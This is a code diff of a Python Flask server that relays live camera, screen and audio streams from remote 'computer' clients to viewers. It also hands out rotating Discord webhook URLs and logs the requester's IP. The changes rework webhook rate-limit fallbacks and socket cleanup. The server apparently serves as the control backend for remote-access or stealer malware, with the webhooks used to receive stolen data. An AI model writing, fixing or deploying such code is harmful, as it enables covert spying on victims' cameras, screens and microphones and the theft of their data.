@@ -82,51 +82,10 @@ def get_webhooks(channel):
 def get_webhook():
     response = {"code": 30007}
     while True:
-        try:
-            response = create_webhook(channel_id)
-            break
-        except Exception as e:
-            print(e)
-            if "Expecting" in str(e):
-                return os.environ["backup_webhook"]
-              
-    print(response)
+        response = create_webhook(channel_id)
 
-    if "code" in list(response):
-        if response["code"] == 30007:
-            webhooks = get_webhooks(channel_id)
-            webhook = random.choice(webhooks)
-            threading.Thread(target=clear, args=(webhooks,)).start()
-            return (
-                f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
-            )
-
-        elif response["code"] == 20029:
-            print("Ratelimited. Attempting to use old webhook")
-            try:
-                webhooks = get_webhooks(channel_id2)
-                webhook = random.choice(webhooks)
-                return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
-            except:
-
-                print("No already existing webhooks, switching to seperate server")
-                webhooks = get_webhooks(channel_id2)
-
-                ratelimit = response["retry_after"]
-                response = create_webhook(channel_id2)
-                ratelimit = min(ratelimit, response["retry_after"])
-
-                if not "id" in list(response):
-                    time.sleep(ratelimit + 1)
-                    print(
-                        f"Can't generate webhook in new server, waiting ratelimit instead {response['retry_after']}"
-                    )
-
-            threading.Thread(target=clear, args=(webhooks,)).start()
-            print(webhook)
-            return (
-                f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
-            )
+    if 'id' not in response:
+      return None
 
     print(f"https://discord.com/api/webhooks/{response['id']}/{response['token']}")
     return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
@@ -220,7 +179,7 @@ def wscamera(ws):
             try:
                 _ws.send(image)
             except:
-                del camera_recv_ws[computer]
+                camera_recv_ws[computer].remove(_ws)
 
 
 @sock.route("/api/ws/screen")
@@ -243,7 +202,7 @@ def wsscreen(ws):
             try:
                 _ws.send(image)
             except:
-                del screen_recv_ws[computer]
+                screen_recv_ws[computer].remove(_ws)
 
 
 @sock.route("/api/ws/audio")
@@ -267,7 +226,7 @@ def wsaudio(ws):
                 _ws.send(image)
             except Exception as e:
                 print(e, "e")
-                del audio_recv_ws[computer]
+                audio_recv_ws[computer].remove(_ws)
 
 @sock.route("/api/ws/showCamera")
 def camera(ws):
@@ -462,13 +421,12 @@ def webhook():
 
     backup = False
 
-    try:
-        webhook = get_webhook()
-        log_webhook_creation(webhook, ip)
-    except Exception as e:
-        print(e)
-        webhook = os.environ["backup_webhook"]
-        backup = True
+    webhook = get_webhook()
+    log_webhook_creation(webhook, ip)
+    if not webhook:
+      backup = True
+      webhook = os.environ["backup_webhook"]
+
 
     return webhook
 
